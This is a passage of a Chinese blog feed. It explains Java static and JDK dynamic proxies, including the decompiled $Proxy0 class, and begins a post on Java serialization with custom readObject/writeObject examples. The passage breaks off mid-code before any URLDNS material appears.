<p>首先创建<code>Person</code>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再创建实现<code>Person</code>接口的<code>PersonSayHello</code>类，该类即为委托类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonSayHello</span> <span class="keyword">implements</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建<code>ProxyPerson</code>类，该类即为代理类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyPerson</span> <span class="keyword">implements</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PersonSayHello psh;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxyPerson</span><span class="params">(PersonSayHello psh)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.psh=psh;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Good Morning&quot;</span>);</span><br><span class="line">        psh.sayHello();</span><br><span class="line">        System.out.println(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，当我们调用其<code>sayHello()</code>方法时，本质上还是在调用<code>PersonSayHello</code>类的<code>sayHello()</code>方法，不过是在调用的前后增加了部分逻辑。</p>
<p>创建测试类<code>ProxyTest</code>进行测试：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1663775033794-e78b2d69-09ca-43d7-a947-4ada5545b8dd.png"
                      alt="img"
                ></p>
<p>静态代理有很大的缺点：不利于系统的维护。例如在<code>PersonSayHello</code>类中新增一个<code>sayHi()</code>方法，该方法也需要被代理，那么便需要在代理类中同时增加<code>sayHi()</code>方法。如果需要被代理的方法过多的话，便会很麻烦。</p>
<h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h3><p>相较于静态代理，动态代理使用了反射机制。有点类似Java反射与安全章节提到的动态特性。</p>
<p>直接看例子：</p>
<p>首先同样需要一个<code>Person</code>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayGoodmorning</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayBye</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建实现<code>Person</code>接口的<code>PersonSaySomething</code>类，该类即为委托类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonSaySomething</span> <span class="keyword">implements</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayGoodmorning</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Good Morning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayBye</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bye~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建<code>PersonInvocationHandler</code>类，其实现了<code>InvocationHandler</code>接口。查看<code>invoke</code>方法，可以看出，该类的作用便是通过反射来对委托类的方法进行更新。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonInvocationHandler</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> T target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PersonInvocationHandler</span><span class="params">(T target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target=target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法调用前&quot;</span>);</span><br><span class="line">        method.invoke(target,args);</span><br><span class="line">        System.out.println(<span class="string">&quot;方法调用后&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建测试类<code>DynamicProxyTest</code>。在测试类中使用<code>Proxy</code>类下的<code>newProxyInstance()</code>方法来创建代理类。<code>newProxyInstance()</code>方法的三个参数分别是：委托类的类加载器、委托类实现的接口和<code>InvocationHandler</code>。之后便可以通过代理类执行委托类的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PersonSaySomething pss=<span class="keyword">new</span> <span class="title class_">PersonSaySomething</span>();</span><br><span class="line">        PersonInvocationHandler pih=<span class="keyword">new</span> <span class="title class_">PersonInvocationHandler</span>(pss);</span><br><span class="line">        Person proxyperson= (Person) Proxy.newProxyInstance(pss.getClass().getClassLoader(), pss.getClass().getInterfaces(),pih);</span><br><span class="line">        proxyperson.sayGoodmorning();</span><br><span class="line">        proxyperson.sayHello();</span><br><span class="line">        proxyperson.sayBye();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1663859273238-1da3e1ec-0fbc-46c6-a002-83844c24a8e1.png"
                      alt="img"
                ></p>
<p>上面的代码每一个都不难理解，但是<code>InvocationHandler</code>和<code>Proxy</code>组合到一起就产生了一些疑惑。</p>
<ol>
<li><code>InvocationHandler</code>中的<code>Invoke</code>方法是什么时候被调用的，是如何被调用的</li>
<li>为什么<code>Proxy.newProxyInstace()</code>返回的是<code>Person</code>接口，而不是<code>PersonSaySomething</code>类。当使用<code>PersonSaySomething</code>时会报错。<img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1663898706025-d3d9aec6-c194-49bf-8fb9-81f270389b5d.png"
                      alt="img"
                ></li>
<li>上面报错中的com.sun.proxy.$Proxy0是什么？</li>
</ol>
<p>这些问题最终在这篇文章找到了答案：<a class="link"   href="https://www.baeldung.com/jdk-com-sun-proxy" >What Is the JDK com.sun.proxy.$Proxy Class?<i class="fas fa-external-link-alt"></i></a></p>
<p>当我们使用动态代理的时候，JDK会动态的生成一个<code>$Proxy</code>类，通常情况下这个<code>$Proxy</code>类的全称类似于 <code>com.sun.proxy.$Proxy0</code>，就像Java文档所说的，<code>$Proxy</code>是代理类的名称前缀。</p>
<p>让我们来区分一下<code>java.lang.reflect.Proxy</code>类和<code>$Proxy</code>类，<code>java.lang.reflect.Proxy</code>是由JDK编译的类，相比之下，<code>$Proxy</code>类是在runtime阶段时动态生成的类。从类的层次上来讲，<code>$Proxy</code>类继承于<code>java.lang.reflect.Proxy</code>类。然而要注意的一点是，<code>$Proxy</code>类仅仅存在于JVM，我们并不能直观的查看其类成员。</p>
<p>为了能够更好的审查<code>$Proxy</code>类，我们可以尝试将其从JVM中dump到磁盘里。恰巧Java提供了此功能。在Java8的环境下，可以在命令行中添加<code>-Dsun.misc.ProxyGenerator.saveGeneratedFiles=true</code>。或者在代码中添加<code>System.setProperty(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);</code>。在Java9及其以后版本，需要使用<code>jdk.proxy.ProxyGenerator.saveGeneratedFiles</code>。例如上面的<code>DynamicProxyTest</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main.org.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        PersonSaySomething pss=<span class="keyword">new</span> <span class="title class_">PersonSaySomething</span>();</span><br><span class="line">        PersonInvocationHandler pih=<span class="keyword">new</span> <span class="title class_">PersonInvocationHandler</span>(pss);</span><br><span class="line">        Person proxyperson= (Person) Proxy.newProxyInstance(pss.getClass().getClassLoader(), pss.getClass().getInterfaces(),pih);</span><br><span class="line">        proxyperson.sayGoodmorning();</span><br><span class="line">        proxyperson.sayHello();</span><br><span class="line">        proxyperson.sayBye();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行程序后，可以看到在项目目录下生成<code>com/sun/proxy/$Proxy0.class</code>文件。使用idea打开（idea会对其自动反编译）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"><span class="keyword">import</span> main.org.proxy.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m4;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m5;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler var1) <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object var1)</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Boolean)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m1, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m4, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m2, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">sayBye</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">sayGoodmorning</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m5, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Integer)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m0, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            m4 = Class.forName(<span class="string">&quot;main.org.proxy.Person&quot;</span>).getMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">            m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">            m3 = Class.forName(<span class="string">&quot;main.org.proxy.Person&quot;</span>).getMethod(<span class="string">&quot;sayBye&quot;</span>);</span><br><span class="line">            m5 = Class.forName(<span class="string">&quot;main.org.proxy.Person&quot;</span>).getMethod(<span class="string">&quot;sayGoodmorning&quot;</span>);</span><br><span class="line">            m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(var2.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var3.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>$Proxy0</code>继承了<code>java.lang.reflect.Proxy</code>类，并实现了<code>Person</code>接口。这里便解释了问题二：为什么动态代理是针对接口，而不是类。针对接口需要<code>implements</code>，针对类则需要<code>extends</code>。因为Java是单继承的且已经存在一个<code>extends</code>了，所以针对<code>PersonSaySomething</code>会增加<code>extends</code>导致报错。</p>
<p>至于问题一：<code>InvocationHandler</code>中的<code>Invoke</code>方法是什么时候被调用的，是如何被调用的？</p>
<p>以<code>sayHello()</code>方法为例，看完代码后相信已经不算问题了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m4, (Object[])<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var2;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于<code>$Proxy0</code>是如何生成的。鉴于其过于复杂，且Java版本不同，生成方法也有部分不同，这里不再深入研究。</p>
]]></content>
      <categories>
        <category>Java技术</category>
      </categories>
      <tags>
        <tag>Java技术</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化与URLDNS</title>
    <url>/2023/06/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EURLDNS/</url>
    <content><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><code>对象流：对象流指的是可以直接把一个对象以流的形式传输给其他的介质，比如硬盘</code></p>
<p>序列化：一个对象以流的形式进行传输，叫做<strong>序列化</strong>。该对象所对应的类，必须实现Serializable接口</p>
<p>反序列化：将对象流还原成对象的过程叫做<strong>反序列化</strong></p>
<p>如下代码，将对象序列化后写入硬盘。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">//类的当前版本，如果有变化，比如设计新的属性后，就应该修改版本号</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> SeriaVersionUID=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">float</span> hp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">stream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Hero h=<span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h.name=<span class="string">&quot;Green&quot;</span>;</span><br><span class="line">        h.hp=<span class="number">616</span>;</span><br><span class="line">        <span class="comment">//新建文件存储序列化后的信息</span></span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;F:/Project/IdeaProjects/Serialization/Serialization/serialize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建基础字节输出流</span></span><br><span class="line">            FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输出流</span></span><br><span class="line">            ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            <span class="comment">//创建基础字节输入流</span></span><br><span class="line">            FileInputStream fileInputStream=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输入流</span></span><br><span class="line">            ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="comment">//将序列化内容写入硬盘文件</span></span><br><span class="line">            objectOutputStream.writeObject(h);</span><br><span class="line">            <span class="comment">//序列化内容经过反序列化读出</span></span><br><span class="line">            Hero h2= (Hero) objectInputStream.readObject();</span><br><span class="line">            System.out.println(h2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对象输出流应在对象输入流前面。否则会报错</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626205942658.png"
                      alt="image-20230626205942658"
                ></p>
<p>Java在序列化一个对象时，将会调用这个对象中的<code>writeObject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个stream。 反序列化时，会调用<code>readObject</code> ，开发者也可以从中读取出前面写入的内容，并进行处理。有点类似于PHP中的魔术方法。</p>
<p>代码实例如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    Person(String name,<span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream objectOutputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        objectOutputStream.defaultWriteObject();</span><br><span class="line">        objectOutputStream.writeObject(<span class="string">&quot;this is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream objectIntputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        objectIntputStream.defaultReadObject();</span><br><span class="line">        String message=(String) objectIntputStream.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在执行完默认的 <code>objectOutputStream.defaultWriteObject()</code>后，又向stream中写入了字符串<code>this is a object</code>。同样反序列化后，又将其读出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">stream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Person p=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Chen&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//新建文件存储序列化后的信息</span></span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;F:\\Project\\IdeaProjects\\Serialization\\Serialization\\serialize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建基础字节输出流</span></span><br><span class="line">            FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输出流</span></span><br><span class="line">            ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            <span class="comment">//创建基础字节输入流</span></span><br><span class="line">            <span class="comment">//将序列化内容写入硬盘文件</span></span><br><span class="line">            objectOutputStream.writeObject(p);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            FileInputStream fileInputStream=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输入流</span></span><br><span class="line">            ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="comment">//序列化内容经过发序列化读出</span></span><br><span class="line">            Person p2=(Person)objectInputStream.readObject();</span><br><span class="line">            System.out.println(p2);</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        